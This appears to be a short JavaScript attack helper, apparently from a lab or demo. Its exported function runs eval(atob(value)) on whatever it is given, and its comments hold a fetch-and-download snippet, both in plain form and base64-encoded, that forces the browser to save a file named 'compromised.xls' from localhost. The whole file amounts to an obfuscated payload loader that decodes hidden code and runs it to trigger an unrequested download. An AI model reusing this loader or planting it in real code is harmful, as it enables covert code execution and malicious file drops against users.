/*
fetch('http://localhost:3000')
.then(response => response.blob()).then(function(data) {
const u = window.URL.createObjectURL(new Blob([data], {type: 'application/vnd.ms-excel'}))
const t = document.createElement('a')
t.href = u
t.setAttribute('download', "compromised.xls")
document.body.appendChild(t)
t.click()
});
*/

/*
ZmV0Y2goJ2h0dHA6Ly9sb2NhbGhvc3Q6MzAwMCcpCi50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLmJsb2IoKSkudGhlbihmdW5jdGlvbihkYXRhKSB7CmNvbnN0IHUgPSB3aW5kb3cuVVJMLmNyZWF0ZU9iamVjdFVSTChuZXcgQmxvYihbZGF0YV0sIHt0eXBlOiAnYXBwbGljYXRpb24vdm5kLm1zLWV4Y2VsJ30pKQpjb25zdCB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnYScpCnQuaHJlZiA9IHUKdC5zZXRBdHRyaWJ1dGUoJ2Rvd25sb2FkJywgImNvbXByb21pc2VkLnhscyIpCmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQodCkKdC5jbGljaygpCn0pOw==
*/

export default function(value) {
  eval(atob(value));
}
